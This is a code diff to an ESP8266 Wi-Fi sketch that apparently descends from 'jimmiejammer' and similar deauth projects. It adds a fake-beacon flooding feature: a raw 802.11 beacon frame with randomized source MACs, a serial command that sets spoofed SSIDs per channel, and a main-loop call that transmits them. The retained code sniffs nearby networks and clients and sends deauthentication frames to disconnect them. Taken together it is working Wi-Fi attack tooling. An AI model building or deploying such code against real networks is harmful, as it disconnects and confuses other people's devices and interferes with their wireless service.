@@ -6,6 +6,9 @@
  * in turn based on RandDruid/esp8266-deauth (MIT) https://github.com/RandDruid/esp8266-deauth
  * inspired by kripthor/WiFiBeaconJam (no license) https://github.com/kripthor/WiFiBeaconJam
  * https://git.schneefux.xyz/schneefux/jimmiejammer/src/master/jimmiejammer.ino
+ *
+ * Fake beacon code based on H-LK/ESP8266-SSID-Text-Broadcast (no license) https://github.com/H-LK/ESP8266-SSID-Text-Broadcast
+ * in turn based on kripthor/WiFiBeaconJam (no license) https://github.com/kripthor/WiFiBeaconJam
  */
 
 #include <ESP8266WiFi.h>
@@ -83,8 +86,7 @@ struct sniffer_buf2 {
 /*
  * Data structure for beacon information
  */
-struct beaconinfo
-{
+struct beaconinfo {
   uint8_t beacon[ETH_MAC_LEN];
   uint8_t ssid[33];
   uint8_t ssid_len;
@@ -97,8 +99,7 @@ struct beaconinfo
 /*
  * Data structure for client information
  */
-struct clientinfo
-{
+struct clientinfo {
   uint8_t beacon[ETH_MAC_LEN];
   uint8_t station[ETH_MAC_LEN];
   uint8_t rssi;
@@ -112,6 +113,7 @@ struct clientinfo
  */
 beaconinfo beacons_known[MAX_BEACONS];
 clientinfo clients_known[MAX_CLIENTS];
+char fake_beacon_ssid[14][14];
 unsigned int beacons_count = 0;
 unsigned int beacons_index = 0;
 unsigned int clients_count = 0;
@@ -123,8 +125,7 @@ uint8_t nothing_new = 0;
 /*
  * Function that parses beacon information from frame
  */
-struct beaconinfo parse_beacon(uint8_t *frame, uint16_t framelen, signed rssi)
-{
+struct beaconinfo parse_beacon(uint8_t *frame, uint16_t framelen, signed rssi) {
   struct beaconinfo bi;
   bi.ssid_len = 0;
   bi.channel = 0;
@@ -184,27 +185,27 @@ struct clientinfo parse_client(uint8_t *frame, uint16_t framelen, signed rssi) {
   uint8_t *beacon;
   uint8_t *station;
   uint8_t ds;
-  ds = frame[1] & 3;    //Set first 6 bits to 0
+  ds = frame[1] & 3;
   switch (ds) {
     case 0:
-      beacon = frame + 16;
-      station = frame + 10;
+      beacon = frame+16;
+      station = frame+10;
       break;
     case 1:
-      beacon = frame + 4;
-      station = frame + 10;
+      beacon = frame+4;
+      station = frame+10;
       break;
     case 2:
-      beacon = frame + 10;
-      if (memcmp(frame + 4, broadcast1, 3) || memcmp(frame + 4, broadcast2, 3) || memcmp(frame + 4, broadcast3, 3)) {
-        station = frame + 16;
+      beacon = frame+10;
+      if (memcmp(frame+4, broadcast1, 3) || memcmp(frame+4, broadcast2, 3) || memcmp(frame+4, broadcast3, 3)) {
+        station = frame+16;
       } else {
-        station = frame + 4;
+        station = frame+4;
       }
       break;
     case 3:
-      beacon = frame + 10;
-      station = frame + 4;
+      beacon = frame+10;
+      station = frame+4;
       break;
   }
   memcpy(ci.station, station, ETH_MAC_LEN);
@@ -217,8 +218,7 @@ struct clientinfo parse_client(uint8_t *frame, uint16_t framelen, signed rssi) {
 /*
  * Function that stores information about single beacon
  */
-int store_beacon(beaconinfo bi)
-{
+int store_beacon(beaconinfo bi) {
   int known = 0;
   int u;
   for (u = 0; u < beacons_count; u++) {
@@ -242,8 +242,7 @@ int store_beacon(beaconinfo bi)
 /*
  * Function that stores information about single client
  */
-int store_client(clientinfo ci)
-{
+int store_client(clientinfo ci) {
   int known = 0;
   int u;
   for (u = 0; u < clients_count; u++) {
@@ -267,8 +266,7 @@ int store_client(clientinfo ci)
 /*
  * Callback function for promiscuous mode that parses received packet
  */
-void parse_packet(uint8_t *buf, uint16_t len)
-{
+void parse_packet(uint8_t *buf, uint16_t len) {
   int i = 0;
   if (len == 12) {
     struct RxControl *sniffer = (struct RxControl*) buf;
@@ -291,11 +289,13 @@ void parse_packet(uint8_t *buf, uint16_t len)
 /*
  * Send deauth packets to client.
  */
-uint8_t template_da[26] = {0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x6a, 0x01, 0x00};
-void deauth_client(clientinfo ci)
-{
+uint8_t deauth_template[26] = {
+  0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x6a, 0x01, 0x00
+};
+void deauth_client(clientinfo ci) {
   uint8_t packet_buffer[64];
-  memcpy(packet_buffer, template_da, 26);
+  memcpy(packet_buffer, deauth_template, 26);
   memcpy(packet_buffer + 4, ci.station, ETH_MAC_LEN);
   memcpy(packet_buffer + 10, ci.beacon, ETH_MAC_LEN);
   memcpy(packet_buffer + 16, ci.beacon, ETH_MAC_LEN);
@@ -305,6 +305,32 @@ void deauth_client(clientinfo ci)
     packet_buffer[23] = seq / 0xFF;
     wifi_send_pkt_freedom(packet_buffer, 26, 0);
     delay(1);
+  }
+}
+
+
+/*
+ * Send fake beacon packets.
+ */
+uint8_t beacon_packet[128] = {
+  0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
+  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0xc0, 0x6c, 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
+  0x64, 0x00, 0x01, 0x04, 0x00, 0x0e, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
+  0x72, 0x72, 0x72, 0x72, 0x72, 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03,
+  0x01, 0x04
+};
+void fake_beacon(char *ssid, uint8_t packets) {
+  if (strlen(ssid) > 0 && packets > 0) {
+    beacon_packet[10] = beacon_packet[16] = random(256);
+    beacon_packet[11] = beacon_packet[17] = random(256);
+    beacon_packet[12] = beacon_packet[18] = random(256);
+    beacon_packet[13] = beacon_packet[19] = random(256);
+    beacon_packet[14] = beacon_packet[20] = random(256);
+    beacon_packet[15] = beacon_packet[21] = random(256);
+    strncpy((char *)beacon_packet+38, ssid, 14);
+    for (uint8_t i = 0; i < packets; i++) {
+      wifi_send_pkt_freedom(beacon_packet, 57, 0);
+    }
   }
 }
 
@@ -325,8 +351,7 @@ void print_beacon(beaconinfo bi) {
 /*
  * Function that prints single client in JSON format
  */
-void print_client(clientinfo ci)
-{
+void print_client(clientinfo ci) {
   Serial.print("\"");
   for (int i = 0; i < ETH_MAC_LEN; i++) {
     if (i > 0) Serial.print(":");
@@ -402,6 +427,15 @@ void read_command() {
       }
     }
   }
+  else if (strcmp(command, "fake_beacon") == 0) {
+    char *argument_ssid;
+    uint8_t argument_channel = strtol(argument, &argument_ssid, DEC);
+    if (argument_ssid != argument) {
+      if (*argument_ssid != '\0') argument_ssid++;
+      memset(fake_beacon_ssid[argument_channel-1], 0, 14);
+      strncpy(fake_beacon_ssid[argument_channel-1], argument_ssid, 14);
+    }
+  }
   else if (strcmp(command, "print_all") == 0) {
     print_all();
   }
@@ -441,6 +475,7 @@ void loop() {
   else {
     nothing_new++;
   }
+  fake_beacon(fake_beacon_ssid[channel-1], 4);
   delay(1);
   if (Serial.available() > 0) {
     read_command();
